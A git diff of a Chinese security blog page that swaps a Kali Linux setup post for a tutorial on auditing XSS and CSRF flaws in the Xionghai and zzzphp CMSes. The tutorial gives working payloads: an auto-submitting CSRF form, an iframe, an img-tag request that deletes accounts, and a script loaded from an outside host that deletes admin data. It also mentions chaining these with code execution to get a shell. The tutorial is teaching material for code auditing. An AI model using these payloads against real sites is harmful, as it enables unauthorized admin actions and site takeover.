@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="kali的基本配置, Youngboy,github">
+    <meta name="keywords" content="XSS与CSRF审计, Youngboy,github">
     <meta name="description" content="北冥有鱼，其名为鲲，鲲之大，不知其几千里也； 化而为鸟，其名为鹏.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>kali的基本配置 | Young&#39;s Blogs</title>
+    <title>XSS与CSRF审计 | Young&#39;s Blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -319,12 +319,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">kali的基本配置</h1>
+                    <h1 class="description center-align post-title">XSS与CSRF审计</h1>
                 </div>
             </div>
         </div>
@@ -449,8 +449,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/kali/" class="post-category">
-                                kali
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
                             </a>
                         
                     </div>
@@ -462,21 +462,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-16
+                    2020-04-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-03-17
+                    2020-04-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    776
+                    947
                 </div>
                 
 
@@ -499,48 +499,51 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-：vmware网络配置"><a href="#0x01-：vmware网络配置" class="headerlink" title="0x01 ：vmware网络配置"></a>0x01 ：vmware网络配置</h1><hr>
-<p>在有下角有个网络适配器<br><img src="https://img-blog.csdnimg.cn/20200317004057207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt=""><br>点击一下就出现了虚拟机设置<br><img src="https://img-blog.csdnimg.cn/20200317004201978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_5,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_14,color_FFFFFF,t_60" alt="在这里插入图片描述"><br>虚拟机有三个网络配置<br><code>1</code>：桥接模式（虚拟机和主机在同一个网络环境下的两台电脑）<br><code>2</code>：NAT模式（虚拟机通过主机联网）<br><code>3</code>：主机模式（只能虚拟机和主机直接交互）<br>前面2个应该比较熟悉，而第三个，意思就是无法ping通外网，只能虚拟机和宿主机直接互相ping通</p>
-<h1 id="0x02：kali系统更新配置"><a href="#0x02：kali系统更新配置" class="headerlink" title="0x02：kali系统更新配置"></a>0x02：kali系统更新配置</h1><hr>
-<p>更新配置这里使用老版本的，新版本的以后在弄（新版本msf依赖下载好慢，不习惯）</p>
-<p>选择不更新 Metasploit<br><strong>1:</strong> 查看当前的系统中所有软件包状态</p>
-<p><code>sudo dbjg --get-selections | more</code><br>这时候可以找打软件包为 “metasploit-framework”<br><strong>2:</strong> 给metasploit-framework锁定当前版本不更新</p>
-<p><code>sudo apt-mark hold metasploit-framework</code><br><strong>3：</strong> 查看当前已锁定的软件包<br><code>sudo dbkg --get-selections | grep hold</code><br><strong>4:</strong> 取消软件保留设置</p>
-<p><code>sudo -apt-mark unhold metasploit-framework</code><br>但是一般情况下的话不会去锁定哒<del>~</del></p>
-<p><strong>kali系统更新后出现一些问题</strong><br>进入 <code>/usr/share/metasploit-framework</code> 目录下<br>使用命令</p>
-<p><code>gem install bundler</code><br><code>gem update --system</code><br>然后就可以成功的启动了，具体可以问度娘的~~</p>
-<h3 id="一、配置kali系统源"><a href="#一、配置kali系统源" class="headerlink" title="一、配置kali系统源"></a>一、配置kali系统源</h3><p><strong>1.</strong> 使用编辑器打开系统源文本<br><code>leafpad /etc/apt/aources.list</code></p>
-<p><strong>2.</strong> 填写源</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#中科大</span>
-deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-<span class="token comment" spellcheck="true">#阿里云</span>
-deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
-deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
-<span class="token comment" spellcheck="true">#清华大学</span>
-deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
-deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
-<span class="token comment" spellcheck="true">#163</span>
-deb http://mirrors.163.com/debian wheezy main non-free contrib
-deb-src http://mirrors.163.com/debian wheezy main non-free contrib
-deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
-deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
-deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
-<span class="token comment" spellcheck="true">#东软大学</span>
-deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
-deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
-<span class="token comment" spellcheck="true">#官方源</span>
-deb http://http.kali.org/kali kali-rolling main non-free contrib
-deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre>
-<p>任意选一个就好了，可以选清华，或者中科大</p>
-<p><strong>3.</strong> 使用更新命令</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> upgrade <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> dist-upgrade</code></pre>
-<h1 id="0x03：kali配置ssh服务"><a href="#0x03：kali配置ssh服务" class="headerlink" title="0x03：kali配置ssh服务"></a>0x03：kali配置ssh服务</h1><ol>
-<li>开启ss服务</li>
-</ol>
-<p><code>service ssh start</code><br>2. 查看ssh服务状态</p>
-<p><code>service ssh status</code><br>3. 关闭ssh服务</p>
-<p><code>service ssh stop</code><br>步骤：<br>先是打开ssh服务，然后ifconfig查看虚拟机ip<br><img src="https://img-blog.csdnimg.cn/20200317011416793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就可以填主机，协议要选ssh<br>名称随意<br><img src="https://img-blog.csdnimg.cn/20200317011558319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后会提示我们输入用户名，就是虚拟机用户名<br>root （我的是root）<br>填写完后会要求我们输入密码<br><img src="https://img-blog.csdnimg.cn/20200317011712365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入你自己虚拟机的密码既可<br>然后点击记住密码，下次就可以直接登录了<br><img src="https://img-blog.csdnimg.cn/20200317011804574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现这个标志就说明成功了。啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦</p>
+                <h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p>
+<p>XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户控制输入信息输出的地方都是它出现的地方，很多网站的突破口可能就是一个XSS。</p>
+<h1 id="0x01-XSS实战审计"><a href="#0x01-XSS实战审计" class="headerlink" title="0x01 XSS实战审计"></a>0x01 XSS实战审计</h1><p>这次选用的CMS还是熊海，我们通过搭建环境查看输入的地方来审计，学习下高效率审计方式。</p>
+<p><img src="/2020/040120077.htm/1.4.1.png" alt="file"></p>
+<p>随意留言抓包看看他请求的url再去找相对的文件<code>/?r=submit&amp;type=message</code> 当然你还是得看看他是怎么调用文件的，这里就是加载submit文件中的message方法。</p>
+<p>我们来到 files/submit.php</p>
+<p><img src="/2020/040120077.htm/1.4.2.png" alt="file"></p>
+<p>前面的输入基本都没过过滤，到了最后一步<code>$content</code>被 <code>addslashes(strip_tags($content));</code>过滤，所以我们XSS其他地方即可，看到这里我们在挖洞的过程中所以不要纠结一点。</p>
+<p><img src="/2020/040120077.htm/1.4.3.png" alt="file"></p>
+<p>一般过滤xss的函数还有<code>htmlspecialchars</code>，我们审计他的注意点就是查看一些输出函数print、print_r、echo、printf、die、var_dump、var_export。</p>
+<h1 id="0x02-Csrf"><a href="#0x02-Csrf" class="headerlink" title="0x02 Csrf"></a>0x02 Csrf</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。<br>CSRF实际上就是利用你的身份去发送恶意请求，我们需要知道CSRF分为GET型提交的和POST，前者危害更大，后者一般可以寻找XSS来配合我们。GET型的比如一个链接 <a href="http://www.404.com/1.php?id=1" target="_blank" rel="noopener">http://www.404.com/1.php?id=1</a> 访问即可删除账号，然后你在论坛发帖构造<br><code>&lt;img src=&quot;http://www.404.com/1.php?id=1&quot;&gt;</code> 那么访问这个帖子的人账号都将会删除，POST的见下文，造成CSRF的原因就是没有使用token或者验证其他值，审计就看页面有没有token、referer验证，验证是否可以绕过，不过我推荐还是先黑盒，看看有没有token，删除了referer是否能够访问，再结合代码来看。</p>
+<p>我们来看到zzzphp的后台，他是没有token的，同时我们前面审计到了他的代码执行，配合这个csrf就可以直接getshell。</p>
+<p><img src="/2020/040120077.htm/1.4.4.png" alt="file"></p>
+<p>如果你不会自己写这个代码，不妨使用burp生成一个测试页面，右键选择即可。</p>
+<p><img src="/2020/040120077.htm/1.4.5.png" alt="file"></p>
+<p>这是个需要点击的表单,你可以加一段JavaScript代码来自动提交。</p>
+<pre><code>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
+</code></pre><h1 id="0x03-组合利用"><a href="#0x03-组合利用" class="headerlink" title="0x03 组合利用"></a>0x03 组合利用</h1><p>这里只是个简单的组合，由于没找到具体实验环境我只有简单的演示一下(懒)<br>本次选妃zzzphp，由于他后台没有的xss，我只能登陆后台后查看前台了。</p>
+<p>1.构造CSRF表单自动提交<br>payload：</p>
+<pre><code>&lt;html&gt;
+  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+  &lt;body&gt;
+         //burp生成的表单
+      &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
+
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>2.插入iframe标签</p>
+<p>payload：</p>
+<pre><code>&lt;iframe src=&quot;http://404.com/zzzp6p/1.html&quot; /&gt;</code></pre><p>还可以使用XMLHTTPRequest发送POST、GET，按情况选择，这里把payload插入手机号码。</p>
+<p><img src="/2020/040120077.htm/1.4.6.png" alt="file"></p>
+<p>用登陆了后台后访问页面，可以看到显示修改成功。</p>
+<p>由于没找到想要的源码我简单介绍下利用XMLHTTPRequest来发包,漏洞程序还是熊海cms删除一友情链接</p>
+<p>payload 1.js：</p>
+<pre><code>function del() {
+    var xhr = new XMLHttpRequest();
+    xhr.open(&#39;GET&#39;,&#39;/xiong/admin/?r=linklist&amp;delete=6&#39;);
+    xhr.send(null);
+    }
+del();
+</code></pre><p>payload：</p>
+<pre><code>&lt;script src=&quot;http://404.com/xiong/1.js&quot;&gt;&lt;/script&gt; 
+</code></pre><p>查看留言板可以看到我们的XMLHTTPRequest已经发包了</p>
+<p><img src="/2020/040120077.htm/1.4.7.png" alt="file"></p>
+<p>比较典型的例子可以看看 <a href="https://xz.aliyun.com/t/3177" target="_blank" rel="noopener">https://xz.aliyun.com/t/3177</a></p>
 
             </div>
             <hr/>
@@ -566,7 +569,7 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://youngscript.github.io/2020/031611755.html">http://youngscript.github.io/2020/031611755.html</a>
+                    <a href="http://youngscript.github.io/2020/040120077.html">http://youngscript.github.io/2020/040120077.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1030,44 +1033,44 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/031626401.html">
+                <a href="/2020/040120077.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="SQL注入">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="XSS与CSRF审计">
                         
-                        <span class="card-title">SQL注入</span>
+                        <span class="card-title">XSS与CSRF审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言——————————————————————————————————————
-这是我之前发布到的其他的一个网址，这里的话我重新总结
-可能分很多，我也不是很清楚，只是皮毛的研究了一下
-1，sql按数据库分的话，常用的有：MySQL，acc
+                            0x00 简介本文章来自 公众号：404安全
+XSS分为反射型和储存型，一般来说反射型的用处不是很大利用难度相对较高，存储型XSS一般常见于发布评论、留言、收获地址、个人信息等等。对于xss的审计我们一般就在这些点找，有用户控制输入信息输出
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL/" class="post-category">
-                                    SQL
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1078,32 +1081,32 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib</code></pre
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/031665118.html">
+                <a href="/2020/040155793.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="2020版本kali安装">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="文件操作审计">
                         
-                        <span class="card-title">2020版本kali安装</span>
+                        <span class="card-title">文件操作审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言——————————————————————————————————————总所周知，这个最新版本的变化很大（其实就是桌面变化大）其实嘞，物竞天择，随时代潮流。我刚好想试一试，那么就安装一个最新版本的，kali 2020.1
-正文第一步
+                            简介本文章来自 公众号：404安全
+0x00 文件包含本地包含本地文件包含（Local File Include）简称 LFI，文件包含在php中，一般涉及到的危险函数有include()、include_once()、require()、
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-01
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/kali/" class="post-category">
-                                    kali
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
